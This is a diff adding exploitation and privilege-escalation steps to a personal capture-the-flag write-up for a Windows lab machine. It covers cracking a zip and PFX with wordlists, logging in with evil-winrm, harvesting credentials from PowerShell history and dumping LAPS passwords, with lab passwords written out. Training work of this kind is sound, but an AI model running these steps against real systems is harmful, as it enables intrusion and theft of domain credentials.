@@ -67,10 +67,120 @@ mget *
 >[!example]- Result
 >![[Pasted image 20250306120853.png]]
 
-- if we list the content of the `zip` file we found a `.pfx`
+# Exploitation
+- if we list the content of the `zip` file we found a `.pfx` (a type of file that contains private and public keys but are encrypted with a password)
 ```bash
 7z l rm_backup.zip
 ```
 >[!example]- Result
 >![[Pasted image 20250306122748.png]]
+
+- lets try to crack the file using [[fcrackzip]]
+```bash
+fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt rm_backup.zip
+```
+>[!example]- Result
+>![[Pasted image 20250306150308.png]]
+
+password:`supremelegacy`
+
+```bash
+unzip rm_backup.zip
+```
+
+- now we can try to open this file `.pfx` but as we now we need a password (its not the same of `.zip`)
+```bash
+openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out privateKey.pem -nodes
+```
+>[!example]- Result
+>![[Pasted image 20250306151122.png]]
+
+- we can use [[pfx2john]] in order to get a hash, or we can use [[crackpkcs12]]
+```bash
+crackpkcs12 -b -d /usr/share/wordlists/rockyou.txt legacyy_dev_auth.pfx
+```
+>[!example]- Result
+>![[Pasted image 20250306152121.png]]
+
+password: `thuglegacy`
+- Perfect now we can use this password, and get the Private key and the certificate
+```bash
+openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out privateKey.pem -nodes
+```
+>[!example]- Result
+>![[Pasted image 20250306152235.png]]
+>![[Pasted image 20250306152259.png]]
+
+```bash
+openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out certificate.pem
+```
+>[!example]- Result
+>![[Pasted image 20250306152827.png]]
+
+## Intrusion
+- We have a private key and a certificate so if we check the opened port we can se that port `5986` is enabled, thats means that winrm is enabled but using ssl, we can try to use this files in order to get a revershell using [[evil-winrm]]
+```bash
+evil-winrm -c certificate.pem -S -k privateKey.pem -i 10.10.11.152
+```
+>[!example]- Result
+>![[Pasted image 20250306154052.png]]
+
+# Privilege Escalation
+## Enumeration
+- we can use [[PrivescCheck]] and try to get some info
+```bash
+powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
+```
+>[!example]- Result
+>![[Pasted image 20250306155810.png]]
+>![[Pasted image 20250306155844.png]]
+>
+
+
+- if we check the users we can see this
+```bash
+net users
+```
+>[!example]- Result
+>![[Pasted image 20250306163551.png]]
+
+- and if we check this user is part of the group `LAPS_READERS` (LAPS =   “Local Administrator Password Solution” so this users can read users password in AD), so this user is a nice target
+```bash
+net users svc_deploy
+```
+>[!example]- Result
+>![[Pasted image 20250306171717.png]]
+
+- If we check we see this credentials into the PowerShell history
+```bash
+cat $env:appdata/microsoft/windows/powershell/psreadline/consolehost_history.txt
+```
+>[!example]- Result
+>![[Pasted image 20250306173535.png]]
+
+credentials: `svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV`
+
+- now we can get a connection using [[evil-winrm]] again (because is part of the remote management group)
+```bash
+evil-winrm -S -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -i 10.10.11.152
+```
+>[!example]- Result
+>![[Pasted image 20250306174121.png]]
+
+- perfect now using this tool,[[Get-LAPSPasswords.ps1]], we can get the plain text passwords
+```bash
+. .\Get-LAPSPasswords.ps1
+Get-LAPSPasswords
+```
+>[!example]- Result
+>![[Pasted image 20250306175042.png]]
+
+password:`TM&X]b{lu]&/Q{80QY)c2qp[`
+
+- we try this password to get access to administrator user and we got access
+```bash
+evil-winrm -S -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -i 10.10.11.152
+```
+>[!example]- Result
+>![[Pasted image 20250306175458.png]]
 
